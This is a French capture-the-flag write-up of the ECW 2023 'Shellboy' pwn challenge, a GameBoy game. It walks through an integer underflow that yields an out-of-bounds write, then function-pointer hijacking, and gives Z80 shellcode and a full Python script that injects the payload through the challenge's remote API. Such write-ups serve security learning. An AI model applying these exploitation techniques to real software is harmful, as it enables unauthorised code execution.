---
title: "[ECW 2023] - Shellboy"
subtitle: ""
date: 2023-11-01
draft: false
author: "LelBy"
description: ""
images: []

tags: ["ECW", "Write-up", "Gameboy"]
categories: ["Pwn"]

featuredImage: ""
featuredImagePreview: ""
---

## Introduction

Ce challenge provient de la phase de qualification de l'ECW 2023.

Shellboy est un challenge de pwn se jouant sur un émulateur de GameBoy (WASMBoy). Les ressources données sont :
- Le code source
- La cartouche compilée
- Une API Web pour interagir avec l'instance distante 

![](images/ECW-2023/shellboy_main.png)

## Premiers pas

Dans ce jeu, nous pouvons définir une liste d'instruction permettant à notre petit personnage de se déplacer de haut en bas et de droite à gauche. En effet, il est possible :

- De naviguer dans la liste d'instruction avec `left` et `right`
- D'ajouter une instruction avec la touche `A` et son type avec les flèches directionnelles (`up`, `down`, `left`, `right`)
- De supprimer une instruction (et ses répétitions) avec le bouton `B`
- De préciser le nombre d'instruction du même type avec les touches directionnelles `up` et `down` jusqu'à 255
- De fusionner ou de bouger deux instructions entre elles en appuyant sur `select` pour la première et `select` pour la seconde. Si les deux instructions sont de même type, alors elles seront fusionnées (addition de leur répétition). Si elles sont différentes, elles changeront de place dans la liste.
- De lancer la simulation avec le bouton `start`

![](images/ECW-2023/Pasted%20image%2020231112203458.png)

## Vulnérabilité

En jouant un petit peut avec le jeu (en appuyant sur toute les touches comme un bourrin :joy:) , je me suis rendu compte d'un comportement anormale avec la fonctionnalité de fusion des instructions.

En effet, j'ai remarqué qu'en fusionnant une instruction avec elle même, un comportement étrange se produit : 

![](images/ECW-2023/Pasted%20image%2020231112205137.png)

Le curseur de sélection n'est pas changé, mais la liste d'instruction diminue tout de même. En répétant le processus un certain nombre de fois, on passe tout a coup de 0 instructions à 255.

![](images/ECW-2023/Pasted%20image%2020231112205306.png)

En effet, il est possible de parcourir plus que 16 cases avec le curseur maintenant. Il est temps de se pencher sur le code source.

Dans le fichier `inst_list.c`, on remarque la fonction `move_inst()` :

```c
void move_inst(uint8_t inst1_index, uint8_t inst2_index)
{
    uint8_t inst1_id = inst_ids[inst1_index];
    uint8_t inst2_id = inst_ids[inst2_index];
    
    // ...
    
    if(inst1_id == inst2_id)
    {
        uint16_t rpt_sum = inst1_rpt + inst2_rpt;
        if(rpt_sum > 255)
        {
            // If the sum of repetitions is more than a stack (255),
            // we fill the first stack to the maximum and put the rest in the second
            inst_rpt[inst1_index] = 255;
            inst_rpt[inst2_index] = rpt_sum - 255;
        }
        else
        {
            // If the sum of repetitions is less than a stack (255),
            // we merge all in the first stack and delete the second
            inst_rpt[inst1_index] = rpt_sum;
            remove_inst(inst2_index);
        }
    }
    // Second case. IDs are differents, so we swap instructions
    else
    {
        // ...
    }
}
```

On remarque dans ce code, que lorsque deux instructions sont de même type, et que la somme de leur répétition est inférieur à 255, alors on supprime la deuxième stack d'instructions. Or, dans notre cas, les instructions sont les même ! 

```c
void remove_inst(uint8_t inst_index)
{
    if(inst_index + 1 != inst_count)
    {
        // Shift all following instructions in the instruction list
        for(uint8_t i = 0, j = 0; i < MAX_INST && j < MAX_INST; i++, j++)
        {
            if(i == inst_index)
            {
                j++;
            }
            inst_ids[i] = inst_ids[j];
            inst_rpt[i] = inst_rpt[j];
        }
    }
    inst_count--;
}
```

Lorsque la stack d'instruction est supprimée, la variable globale `inst_count` est décrémentée. Mais ce n'est pas tout !

```c
// ...
// Remove the selected instruction
else if(KEY_TRIGGERED(J_B) && !list_empty)
{
	remove_inst(inst_cursor_pos);
	list_empty = inst_count == 0;
	inst_cursor_pos = 0;
}
// ...	
// Swap/Merge the selected instruction
else if(KEY_TRIGGERED(J_SELECT) && !list_empty)
{
	if(is_moving_inst)
	{
		move_inst(inst_cursor_pos, selected_index);
		is_moving_inst = false;
	}
	else
	{
		selected_index = inst_cursor_pos;
		is_moving_inst = true;
	}
```

Lorsqu'on supprime normalement une instruction  avec la touche `B`, la variable `inst_cusror_pos` est remise à `0`. Si  `inst_count = 0`, alors `list_empty` devient `True`. 

Cependant,  on remarque que la fonction `move_inst()` est appelée sans que `inst_count` ne soit vérifiée et `inst_cursor_pos` réinitialisée. Ce qui permet de pouvoir décrémenter `inst_count` et l'underflow pour la faire passer à `255`, tandis que `inst_cursor_pos` reste à la même position.

```c
// Select next instruction
else if(KEY_TRIGGERED(J_RIGHT))
{
	inst_cursor_pos += (inst_cursor_pos < inst_count - 1) ? 1 : 0;
}
// Increase instruction repetition
else if(KEY_TRIGGERED(J_UP) && !list_empty)
{
	inst_rpt[inst_cursor_pos] += (inst_rpt[inst_cursor_pos] < 255) ? 1 : 2;
}

```

De plus, on observe que la variable `inst_cursor_pos` est utilisé pour accéder aux valeurs contenues dans le tableau `inst_rpt[]`.

Ce tableau contient des valeurs comprises entre `0` et `255`, correspondant au nombre de répétition de chaque instruction. En parallèle, le tableau `inst_ids[]`, contient le type d'instruction. 

Dans un cas normal, ces tableaux ont une taille maximale de 16. Cependant, la variable `inst_cursor_pos` est comprise entre `0` et `inst_count` Si `inst_count` est supérieure à `16`, alors nous avons une OOB (Out-of-Bound) sur le tableau `inst_rpt[]` et `inst_ids[]`.

### Ecriture arbitraire

Grâce à l'observation précédente, il est ainsi possible d'écrire des valeurs comprises entre `0` et `255` dans la mémoire , entre `inst_rpt` et `inst_rpt + 255`. 

Il va être nécessaire de se faire une idée de l'emplacement des variables en mémoire pour exploiter cela.

### Représentation de la mémoire

Cette capture montre la représentation en mémoire des variables : 

![](images/ECW-2023/Pasted%20image%2020231113223153.png)

Et le tableau avec les adresses :

|                      Variable                      |     Adresse     |
|:--------------------------------------------------:|:---------------:|
|     <span style="color:red">inst_funcs[]</span>    | 0xC0B1 à 0xC0B8 |
|   <span style="color:#045AFE">inst_rpt[]</span>    | 0xC0B9 à 0xC0C8 |
|    <span style="color:#01df02">inst_ids[]</span>   | 0xC0C9 à 0xC0D8 |
|    <span style="color:yellow">inst_count</span>    | 0xC0D9          |
| <span style="color:fuchsia">inst_cursor_pos</span> | 0xC0DA          |
| bot_x                                              | 0xC0E1          |
| bot_y                                              | 0xC0E2          |

## Exploitation

### Exécution de code arbitraire

Comme le décris ce petit morceau de code, le but du challenge est d'aller lire le flag à l'adresse `0x06FA`.

```c
// Check the final tile ID to check if the bot is on the flag
if(final_tile_id == FLAG_TILE_ID) {
	bnprintf(1, 4, 18, "Flag is at 0x06FA ");.
```

Une première idée était d'exploiter le tableau de pointeurs `inst_funcs[]` définis ci-dessous :

```c
bool (*inst_funcs[4])() = {
    inst_go_up,
    inst_go_right,
    inst_go_down,
    inst_go_left
};
```

Cependant, `inst_func[]` est situé avant `inst_rpt[]`. On ne peut donc pas réécrire un pointeur de fonction. 

Mais il est possible de regarder comment les fonctions sont appelées ! 

```c
void simulate() {
	// ...
	uint8_t inst_id = inst_ids[i];
	uint8_t inst_rp = inst_rpt[i];
	// ...
	// Repeat the instruction n times
	for(uint8_t j = 0; j < inst_rp; j++) {
		if(inst_funcs[inst_id]()) {
			// Draw only if the instruction succeeded
			draw_simu();
			delay(100);
		}
	}
	// ...
}
```

La fonction a appeler est récupérée dans `inst_func[]` grâce à l'id de l'instruction. Cette id est présent dans `inst_ids[]`. L'id d'une instruction est normalement compris entre `0` et `3`. 

Si l'id a une valeur supérieur à `3`, alors, le pointeur de fonction récupéré est situé en dehors de `inst_func`, entre autre dans une zone que l'on contrôle, précisément au tout début de `int_rpt[]` !

- `inst_func[0]` --> <span style="color:red">0xC0B1</span>
- `inst_func[1]` -->  <span style="color:red">0xC0B3</span>
- `inst_func[2]` --> <span style="color:red">0xC0B5</span>
- `inst_func[3]` --> <span style="color:red">0xC0B7</span>
- `inst_func[4]` --> <span style="color:#045AFE">0xC0B9</span>

On peut le vérifier avec le désassemblé  : 

```nasm
; Z80 Instruction set
; Load de l'id de l'instruction dans HL
ram:0e4f 6e              LD         L,(HL)
ram:0e50 26  00          LD         H,0x0
ram:0e52 29              ADD        HL,HL
; Load de l'adresse de base de inst_func dans DE
ram:0e53 11  b1  c0      LD         DE,0xc0b1   
; Calcul de l'adresse du pointeur à récupérer avec l'id de l'instruction
ram:0e56 19              ADD        HL,DE
; Load du pointeur de fonction dans HL
ram:0e57 2a              LDI        A,(HL)  
ram:0e58 66              LD         H, (HL)
ram:0e59 6f              LD         L, A
ram:0e5a c5              PUSH       BC
; CALL inst_func --> JMP (HL)
ram:0e5b cd  9a  13      CALL       inst_func                                   
```

Sachant que nous pouvons écrire dans `inst_ids[]` la valeur de l'id que l'on veut, il ne reste plus qu'à exploiter !

### Payload

L'idée générale est : 

- Ecrire à partir de l'adresse `0xC0B9` (`inst_rpt[0]`) un pointeur de fonction qui pointe vers `0xC0BB` (`inst_rpt[2]`), car `inst_rpt` est un tableau de `uint_8`.
- Ecrire notre shellcode pour afficher le flag à partir de l'adresse `0xC0BB`.
- Ecrire la valeur `4` dans `inst_ids[0]` permettant de produire le comportement décris ci-dessus
- Notre payload doit avoir une taille inférieur à 32 octets.

Le shellcode permettant d'afficher le flag est le suivant : 

```
; Push de l'adresse de flag
11 FA 06 : LD DE, 0x06FA
d5       : PUSH DE
; Push des coordonnées
21 04 12 : LD HL, 0x1204
e5       : PUSH HL
; Push de count
3e 01    : LD A, 0x1
f5       : PUSH AF
33       : INC SP
; Call de bnprintf (0xC010)
cd c0 10 : CALL bnprintf
E8 05    : ADD SP+5
; Call de delay(2000)
11 d0 F7 : LD DE, 0x7d0
cd 9b 13 : CALL delay
```

Enfin, le payload en hexadécimale est le suivant :

```py
payload = [0xBB, 0xC0, 0x11, 0xFA, 0x06, 0xD5, 0x21, 0x04,
             0x12, 0xE5, 0x3E, 0x01, 0xF5, 0x33, 0x00, 0x00,
             0x04, 0xCD, 0xC0, 0x10, 0xE8, 0x05, 0x11, 0xD0,
             0xF7, 0xCD, 0x9B, 0x13]
```


## Code finale

Une fois notre payload construit, il ne reste plus qu'à interagir avec l'instance distante : 

```py
import requests
import shutil

BUTTON_RIGHT_ARROW  = 0x001
BUTTON_LEFT_ARROW   = 0x002
BUTTON_UP_ARROW     = 0x004
BUTTON_DOWN_ARROW   = 0x008
BUTTON_A            = 0x010
BUTTON_B            = 0x020
BUTTON_SELECT       = 0x040
BUTTON_START        = 0x080
BUTTON_RESET        = 0x100

PORT = 40535
HOST = "instances.challenge-ecw.fr"
  
shellcode = [0xBB, 0xC0, 0x11, 0xFA, 0x06, 0xD5, 0x21, 0x04,
             0x12, 0xE5, 0x3E, 0x01, 0xF5, 0x33, 0x00, 0x00,
             0x04, 0xCD, 0xC0, 0x10, 0xE8, 0x05, 0x11, 0xD0,
             0xF7, 0xCD, 0x9B, 0x13]

  
def press_button(button: int):
    """
    Send a button press to the remote emulator
    """
    requests.get(f"http://{HOST}:{PORT}/setState?state={button}")
    requests.get(f"http://{HOST}:{PORT}/setState?state=0")

def save_frame(path: str):
    """
    Save the current frame to a PNG image
    """
    response = requests.get(f"http://{HOST}:{PORT}/render", stream=True)
    response.raw.decode_content = True

    with open(path, "wb") as f:
        shutil.copyfileobj(response.raw, f)

    print(f"[*] Frame saved at '{path}'")

def main():

    # Initialisation
    press_button(BUTTON_RESET)
    press_button(BUTTON_A)
    press_button(BUTTON_LEFT_ARROW)
    
    # Make inst_count underflow to 0xFF
    for i in range(0, 4):
        press_button(BUTTON_SELECT)

    index = 0
    
    # Writting payload byte per byte from inst_rpt[0]
    for byte in shellcode:
        print(f"[+] Writting bytes {hex(byte)} to inst_rpt[{index}]")

        if byte < 0x7F:
            for b in range(1, byte+1):
                print(f"[INFO] Current value : {hex(b)} written in {index}")
                press_button(BUTTON_UP_ARROW)
                
        else:
            for b in range(0xFE, byte-1, -1):
                print(f"[INFO] Current value : {hex(b)} written in {index}")
                press_button(BUTTON_DOWN_ARROW)
                
        index += 1

        if index == len(shellcode):
            break
        press_button(BUTTON_RIGHT_ARROW)

    # Start simulation and get flag !
    print("[+] Press Start button !")
    press_button(BUTTON_START)

if __name__ == "__main__":
    main()
```

## Flag

Et voici le flag !

![](images/ECW-2023/shellboy_flag.png)